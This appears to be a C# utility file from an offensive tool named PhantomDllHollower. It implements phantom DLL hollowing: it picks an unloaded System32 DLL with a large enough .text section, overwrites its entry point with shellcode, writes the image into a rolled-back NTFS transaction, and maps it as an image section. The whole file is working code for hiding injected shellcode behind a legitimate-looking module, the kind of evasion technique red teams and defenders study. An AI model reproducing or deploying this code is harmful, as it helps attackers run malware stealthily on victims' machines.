using System;
using System.IO;
using System.Runtime.InteropServices;
using PhantomDllHollower.Interop;

namespace PhantomDllHollower.Library
{
    using NTSTATUS = Int32;

    internal class Utilities
    {
        public static IntPtr CreateImageSection(string modulePath)
        {
            NTSTATUS ntstatus;
            IntPtr hFile;
            IntPtr hSection = Win32Consts.INVALID_HANDLE_VALUE;
            int nSizeIoStatusBlock = Marshal.SizeOf(typeof(IO_STATUS_BLOCK));
            IntPtr pIoStatusBlock = Marshal.AllocHGlobal(nSizeIoStatusBlock);
            var objectAttributes = new OBJECT_ATTRIBUTES(
                string.Format(@"\??\{0}", Path.GetFullPath(modulePath)),
                OBJECT_ATTRIBUTES_FLAGS.CaseInsensitive);

            do
            {
                ntstatus = NativeMethods.NtCreateFile(
                    out hFile,
                    ACCESS_MASK.GENERIC_READ,
                    in objectAttributes,
                    pIoStatusBlock,
                    IntPtr.Zero,
                    FILE_ATTRIBUTES.NORMAL,
                    FILE_SHARE_ACCESS.NONE,
                    NT_FILE_CREATE_DISPOSITION.OPEN,
                    FILE_OPEN_OPTIONS.NON_DIRECTORY_FILE,
                    IntPtr.Zero,
                    0u);

                if (ntstatus != Win32Consts.STATUS_SUCCESS)
                {
                    Console.WriteLine("[-] Failed to open target file.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
                    hFile = Win32Consts.INVALID_HANDLE_VALUE;
                    break;
                }

                ntstatus = NativeMethods.NtCreateSection(
                    out hSection,
                    ACCESS_MASK.SECTION_ALL_ACCESS,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    SECTION_PROTECTIONS.PAGE_READONLY,
                    SECTION_ATTRIBUTES.SEC_IMAGE,
                    hFile);

                if (ntstatus != Win32Consts.STATUS_SUCCESS)
                {
                    Console.WriteLine("[-] Failed to create section.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
                    hSection = Win32Consts.INVALID_HANDLE_VALUE;
                }
            } while (false);

            if (hFile != Win32Consts.INVALID_HANDLE_VALUE)
                NativeMethods.NtClose(hFile);

            return hSection;
        }


        public static IntPtr CreateTransactedSection(
            string transactedFilePath,
            byte[] payload)
        {
            NTSTATUS ntstatus;
            int error;
            IntPtr hTransaction;
            IntPtr hTransactedFile = Win32Consts.INVALID_HANDLE_VALUE;
            IntPtr hTransactedSection = Win32Consts.INVALID_HANDLE_VALUE;
            int nSizeIoStatusBlock = Marshal.SizeOf(typeof(IO_STATUS_BLOCK));
            IntPtr pIoStatusBlock = Marshal.AllocHGlobal(nSizeIoStatusBlock);
            Helpers.ZeroMemory(pIoStatusBlock, nSizeIoStatusBlock);

            do
            {
                ntstatus = NativeMethods.NtCreateTransaction(
                    out hTransaction,
                    ACCESS_MASK.TRANSACTION_ALL_ACCESS,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    0,
                    0,
                    0,
                    IntPtr.Zero,
                    IntPtr.Zero);

                if (ntstatus != Win32Consts.STATUS_SUCCESS)
                {
                    Console.WriteLine("[-] Failed to create transaction.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
                    hTransaction = Win32Consts.INVALID_HANDLE_VALUE;
                    break;
                }

                hTransactedFile = NativeMethods.CreateFileTransacted(
                    transactedFilePath,
                    ACCESS_MASK.GENERIC_READ | ACCESS_MASK.GENERIC_WRITE,
                    0,
                    IntPtr.Zero,
                    FILE_CREATE_DISPOSITION.OPEN_EXISTING,
                    FILE_ATTRIBUTES.NORMAL,
                    IntPtr.Zero,
                    hTransaction,
                    IntPtr.Zero,
                    IntPtr.Zero);

                if (hTransactedFile == Win32Consts.INVALID_HANDLE_VALUE)
                {
                    error = Marshal.GetLastWin32Error();
                    Console.WriteLine("[-] Failed to create transacted file.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
                    break;
                }

                ntstatus = NativeMethods.NtWriteFile(
                    hTransactedFile,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    pIoStatusBlock,
                    payload,
                    (uint)payload.Length,
                    IntPtr.Zero,
                    IntPtr.Zero);

                if (ntstatus != Win32Consts.STATUS_SUCCESS)
                {
                    Console.WriteLine("[-] Failed to write payload in the transacted file.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
                    break;
                }

                ntstatus = NativeMethods.NtCreateSection(
                    out hTransactedSection,
                    ACCESS_MASK.SECTION_ALL_ACCESS,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    SECTION_PROTECTIONS.PAGE_READONLY,
                    SECTION_ATTRIBUTES.SEC_IMAGE,
                    hTransactedFile);

                if (ntstatus != Win32Consts.STATUS_SUCCESS)
                {
                    Console.WriteLine("[-] Failed to create section.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
                    break;
                }

                ntstatus = NativeMethods.NtRollbackTransaction(hTransaction, BOOLEAN.TRUE);

                if (ntstatus != Win32Consts.STATUS_SUCCESS)
                {
                    Console.WriteLine("[-] Failed to rollback transaction.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
                }
            } while (false);

            Marshal.FreeHGlobal(pIoStatusBlock);

            if (hTransaction != Win32Consts.INVALID_HANDLE_VALUE)
                NativeMethods.NtClose(hTransaction);

            if (hTransactedFile != Win32Consts.INVALID_HANDLE_VALUE)
                NativeMethods.NtClose(hTransactedFile);

            return hTransactedSection;
        }


        public static string FindTargetModulePath(uint nPayloadSize, bool writable)
        {
            bool isLoaded;
            string result = null;
            var loadedModules = Helpers.GetLoadedModuleList();
            var dlls = Helpers.GetDllListFromDirectory(Environment.SystemDirectory);

            foreach (var dll in dlls)
            {
                isLoaded = false;

                foreach (var mod in loadedModules)
                {
                    if (Helpers.CompareIgnoreCase(mod.Key, Path.GetFileName(dll)))
                    {
                        isLoaded = true;
                        break;
                    }
                }

                if (isLoaded)
                    continue;

                try
                {
                    using (var pe = new PeFile(dll))
                    {
                        if ((pe.GetSectionSizeOfRawData(".text") > nPayloadSize) &&
                            (pe.GetSectionVirtualSize(".text") > nPayloadSize))
                        {
                            if (writable)
                            {
                                if (Helpers.IsWritableFile(dll))
                                    result = dll;
                            }
                            else
                            {
                                result = dll;
                            }
                        }
                    }
                }
                catch
                {
                    continue;
                }

                if (!string.IsNullOrEmpty(result))
                    break;
            }

            return result;
        }


        public static byte[] WriteShellcodeIntoModuleData(
            string targetModulePath,
            byte[] shellcode,
            out uint nEntryPointOffset)
        {
            byte[] payload;
            uint nEntryPointRawOffset;
            IntPtr pShellcodeBuffer;
            nEntryPointOffset = 0u;

            using (var pe = new PeFile(targetModulePath))
            {
                if ((pe.GetSectionSizeOfRawData(".text") > (uint)shellcode.Length) && 
                    (pe.GetSectionVirtualSize(".text") > (uint)shellcode.Length))
                {
                    payload = new byte[pe.SizeOfBuffer];
                    nEntryPointOffset = pe.GetAddressOfEntryPoint();
                    nEntryPointRawOffset = nEntryPointOffset - pe.GetSectionVirtualAddress(".text") + pe.GetSectionPointerToRawData(".text");

                    if (Environment.Is64BitProcess)
                        pShellcodeBuffer = new IntPtr(pe.GetBufferPointer().ToInt64() + nEntryPointRawOffset);
                    else
                        pShellcodeBuffer = new IntPtr(pe.GetBufferPointer().ToInt32() + (int)nEntryPointRawOffset);

                    Marshal.Copy(shellcode, 0, pShellcodeBuffer, shellcode.Length);
                    Marshal.Copy(pe.GetBufferPointer(), payload, 0, payload.Length);
                }
                else
                {
                    payload = new byte[0];
                }
            }

            return payload;
        }
    }
}
